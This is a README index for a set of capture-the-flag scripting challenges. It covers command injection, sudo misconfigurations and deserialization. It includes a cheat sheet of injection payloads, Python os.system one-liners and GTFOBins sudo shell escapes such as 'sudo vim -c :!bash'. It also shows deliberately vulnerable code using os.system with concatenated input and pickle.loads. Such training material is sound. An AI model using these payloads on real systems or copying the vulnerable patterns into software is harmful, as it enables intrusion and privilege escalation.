# App-Script Challenges

Application scripting challenges focusing on exploiting scripting language vulnerabilities and system misconfigurations.

**Challenges Completed:** 14  
**Total Points:** 125

---

## 📝 Available Writeups

### Basic Challenges (⭐)

#### [Bash - System 1](./bash-system-1.md)
- **Points:** 5
- **Difficulty:** Easy
- **Skills:** Linux basics, file enumeration, environment variables

#### Environment Variables
- **Points:** 5
- **Difficulty:** Easy
- **Skills:** PATH manipulation, environment exploitation

---

### Intermediate Challenges (⭐⭐)

#### [Sudo - Weak Configuration](./sudo-weak-configuration.md)
- **Points:** 15
- **Difficulty:** Medium
- **Skills:** Sudo exploitation, privilege escalation, GTFOBins

#### [Bash - System 2](./bash-system-2.md)
- **Points:** 10
- **Difficulty:** Medium
- **Skills:** Advanced bash, command substitution, bypass techniques

#### [Python - Input()](./python-input.md)
- **Points:** 15
- **Difficulty:** Medium
- **Skills:** Python 2 vulnerabilities, code injection, input() exploitation

#### [Perl - Command Injection](./perl-command-injection.md)
- **Points:** 10
- **Difficulty:** Medium
- **Skills:** Perl scripting, command injection, shell metacharacters

#### PHP - Eval
- **Points:** 15
- **Difficulty:** Medium
- **Skills:** PHP code injection, eval() exploitation

#### Node.js - Command Injection
- **Points:** 10
- **Difficulty:** Medium
- **Skills:** Node.js exploitation, command injection in JavaScript

#### Ruby - Command Injection
- **Points:** 10
- **Difficulty:** Medium
- **Skills:** Ruby exploitation, system command injection

#### Bash - Cron
- **Points:** 10
- **Difficulty:** Medium
- **Skills:** Cron job exploitation, timing attacks

---

### Advanced Challenges (⭐⭐⭐)

#### Python - PyYAML
- **Points:** 20
- **Difficulty:** Hard
- **Skills:** YAML deserialization, Python object manipulation

#### Python - Pickle
- **Points:** 20
- **Difficulty:** Hard
- **Skills:** Pickle deserialization, RCE through serialization

#### Java - Server-side Template Injection
- **Points:** 25
- **Difficulty:** Hard
- **Skills:** SSTI, Java template engines, RCE

#### Sudo - Weak Configuration 2
- **Points:** 20
- **Difficulty:** Hard
- **Skills:** Advanced sudo exploitation, security bypass

---

## 🎯 Learning Objectives

### Command Injection
- Understanding command execution in various languages
- Identifying injection points
- Bypassing input filters
- Exploiting shell metacharacters
- Chaining commands

### Privilege Escalation
- Sudo misconfigurations
- SUID binaries
- Cron job exploitation
- PATH hijacking
- Capabilities abuse

### Code Injection
- eval() and exec() vulnerabilities
- Deserialization attacks
- Template injection
- Object injection

---

## 🛠️ Common Tools & Techniques

### Enumeration Tools
```bash
# Check sudo permissions
sudo -l

# Find SUID binaries
find / -perm -4000 2>/dev/null

# Check cron jobs
cat /etc/crontab
crontab -l
ls -la /etc/cron.*

# Environment variables
env
echo $PATH
```

### Exploitation Techniques

**Command Injection Payloads:**
```bash
; ls
| whoami
& cat /etc/passwd
`id`
$(whoami)
```

**Python Code Injection:**
```python
__import__('os').system('whoami')
exec('import os; os.system("whoami")')
```

**Sudo Exploitation:**
```bash
# Common GTFOBins patterns
sudo vim -c ':!bash'
sudo find . -exec /bin/sh \; -quit
sudo awk 'BEGIN {system("/bin/sh")}'
```

---

## 📚 Key Concepts

### 1. Command Injection
Occurs when applications execute system commands with user input without proper sanitization.

**Vulnerable Code Example:**
```python
import os
user_input = input("Enter filename: ")
os.system("cat " + user_input)  # Vulnerable!
```

**Secure Alternative:**
```python
import subprocess
subprocess.run(["cat", user_input], check=True)
```

### 2. Sudo Misconfigurations
Sudo allows specific users to run commands with elevated privileges. Misconfigurations can lead to privilege escalation.

**Example Misconfiguration:**
```
user ALL=(ALL) NOPASSWD: /usr/bin/vim
```

**Exploitation:**
```bash
sudo vim -c ':!bash'
```

### 3. Deserialization Attacks
Insecure deserialization can lead to RCE when untrusted data is deserialized.

**Vulnerable Python Code:**
```python
import pickle
data = pickle.loads(user_data)  # Dangerous!
```

---

## 💡 Challenge Strategies

### For Command Injection
1. Test basic payloads: `;`, `|`, `&`, `&&`, `||`
2. Try command substitution: `` `cmd` ``, `$(cmd)`
3. Bypass filters with encoding
4. Use alternative commands if some are blocked

### For Sudo Exploitation
1. Always run `sudo -l` first
2. Check GTFOBins for the allowed command
3. Test file read/write capabilities
4. Look for environment variable manipulation

### For Code Injection
1. Understand the execution context
2. Test with simple payloads first
3. Escalate to command execution
4. Use language-specific features

---

## 📖 Resources

- [GTFOBins](https://gtfobins.github.io/) - Unix binaries exploitation
- [Command Injection Guide](https://owasp.org/www-community/attacks/Command_Injection)
- [Python Security](https://python.readthedocs.io/en/stable/library/security.html)
- [Deserialization Attacks](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)

---

*Master app-script challenges to understand real-world exploitation techniques!*
